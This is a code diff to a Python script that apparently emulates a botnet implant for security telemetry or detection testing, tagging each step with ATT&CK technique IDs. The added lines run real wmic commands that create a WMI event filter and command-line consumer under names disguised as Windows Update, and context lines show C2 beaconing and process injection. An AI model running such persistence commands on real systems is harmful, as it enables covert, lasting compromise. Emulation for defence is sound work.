@@ -23,8 +23,9 @@ import time
 from datetime import datetime, timezone
 from pathlib import Path
 
-from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import emit_doh_query, fronted_beacon, jittered_sleep, FRONT_DOMAINS
+from naming_helper import phase_delay, pick_mutex, emit_mutex, pick_service_name
 
 
 # =============================================================================
@@ -64,7 +65,12 @@ def main() -> int:
              source_process="svchost_bot.exe", early_exit="COMPROMISED environment")
         return 0
 
-    # --- Phase 1: Persistence via Registry ---
+    # --- Phase 1: Mutex creation ---
+    bot_mutex = pick_mutex()
+    emit_mutex(bot_mutex, "svchost_bot.exe")
+    time.sleep(phase_delay("mutex_create"))
+
+    # --- Phase 2: Persistence via Registry ---
     set_phase("persistence")
     emit("PROCESS", "CREATE_THREAD", "svchost_bot.exe", "INFO",
          source_process="svchost_bot.exe", detail="Installing persistence mechanisms")
@@ -102,7 +108,50 @@ def main() -> int:
         ], capture_output=True, timeout=10)
     except Exception:
         pass
-    jitter(0.3, 0.4)
+    time.sleep(phase_delay("scheduled_task"))
+
+    # --- Phase 2b: WMI Event Subscription persistence ---
+    set_phase("wmi_persistence")
+    emit("PROCESS", "WMI_SUBSCRIBE", "wmic.exe", "CRITICAL",
+         source_process="svchost_bot.exe",
+         detail="Creating WMI permanent event subscription",
+         technique_id="T1546.003")
+    wmi_filter = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
+    emit("REGISTRY", "CREATE_KEY",
+         r"ROOT\subscription:__EventFilter.Name='WindowsUpdateFilter'",
+         "CRITICAL",
+         source_process="svchost_bot.exe",
+         filter_query=wmi_filter,
+         consumer=r"C:\ProgramData\Microsoft\svchost_update.exe",
+         detail="WMI __EventFilter for process-trigger persistence",
+         technique_id="T1546.003")
+    try:
+        subprocess.run([
+            "wmic", "/namespace:\\\\root\\subscription",
+            "create", "__EventFilter",
+            "Name='WindowsUpdateFilter'",
+            f"Query='{wmi_filter}'",
+            "EventNamespace='root\\cimv2'",
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    emit("REGISTRY", "SET_VALUE",
+         r"ROOT\subscription:CommandLineEventConsumer.Name='WindowsUpdateConsumer'",
+         "CRITICAL",
+         source_process="svchost_bot.exe",
+         command_template=r"C:\ProgramData\Microsoft\svchost_update.exe",
+         detail="WMI CommandLineEventConsumer bound to filter",
+         technique_id="T1546.003")
+    try:
+        subprocess.run([
+            "wmic", "/namespace:\\\\root\\subscription",
+            "create", "CommandLineEventConsumer",
+            "Name='WindowsUpdateConsumer'",
+            "CommandLineTemplate='C:\\ProgramData\\Microsoft\\svchost_update.exe'",
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("wmi_subscribe"))
 
     # --- Phase 3: DNS Beaconing + DoH ---
     set_phase("dns_beacon")
@@ -118,7 +167,7 @@ def main() -> int:
         except (socket.gaierror, OSError):
             pass
         emit_doh_query(domain, process_name="svchost_bot.exe")
-        jitter(1.5, 1.0)
+        time.sleep(phase_delay("doh_query"))
 
     # --- Phase 4: HTTP C2 Beaconing with domain fronting ---
     set_phase("http_beacon")
@@ -162,7 +211,7 @@ def main() -> int:
             emit("PROCESS", "CREATE_THREAD", target_proc, "CRITICAL",
                  source_process="svchost_bot.exe", target_pid=proc.pid,
                  detail="Remote thread created — execution hijacked")
-            jitter(1.5, 1.0)
+            time.sleep(phase_delay("process_inject"))
             proc.terminate()
         except Exception as e:
             emit("PROCESS", "CREATE_PROCESS", target_proc, "WARNING",
